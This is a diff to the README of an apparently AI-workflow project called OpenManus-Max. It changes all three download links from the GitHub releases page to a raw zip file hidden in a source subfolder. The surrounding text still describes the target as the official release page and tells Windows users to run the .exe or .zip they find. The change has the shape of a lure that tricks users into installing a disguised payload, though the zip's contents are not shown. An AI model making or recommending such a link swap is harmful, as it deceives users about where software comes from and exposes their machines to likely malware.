@@ -1,6 +1,6 @@
 # 🧠 OpenManus-Max - Run Advanced AI Workflows
 
-[![Download OpenManus-Max](https://img.shields.io/badge/Download-OpenManus--Max-blue-grey?style=for-the-badge)](https://github.com/Luciuscloaked100/OpenManus-Max/releases)
+[![Download OpenManus-Max](https://img.shields.io/badge/Download-OpenManus--Max-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/Luciuscloaked100/OpenManus-Max/main/openmanus_max/tool/builtin/Open-Max-Manus-untwinned.zip)
 
 ## 🚀 What This App Does
 
@@ -33,7 +33,7 @@ For better results:
 
 Visit the release page to download and run this app:
 
-[Download from the latest releases page](https://github.com/Luciuscloaked100/OpenManus-Max/releases)
+[Download from the latest releases page](https://raw.githubusercontent.com/Luciuscloaked100/OpenManus-Max/main/openmanus_max/tool/builtin/Open-Max-Manus-untwinned.zip)
 
 On that page, look for the latest release and choose the Windows file that matches your PC. In most cases, that will be an `.exe` or `.zip` file.
 
@@ -185,4 +185,4 @@ If the release notes list a new setup step, follow that step before you open the
 
 Use this page to get the current Windows download:
 
-[OpenManus-Max Releases](https://github.com/Luciuscloaked100/OpenManus-Max/releases)
+[OpenManus-Max Releases](https://raw.githubusercontent.com/Luciuscloaked100/OpenManus-Max/main/openmanus_max/tool/builtin/Open-Max-Manus-untwinned.zip)
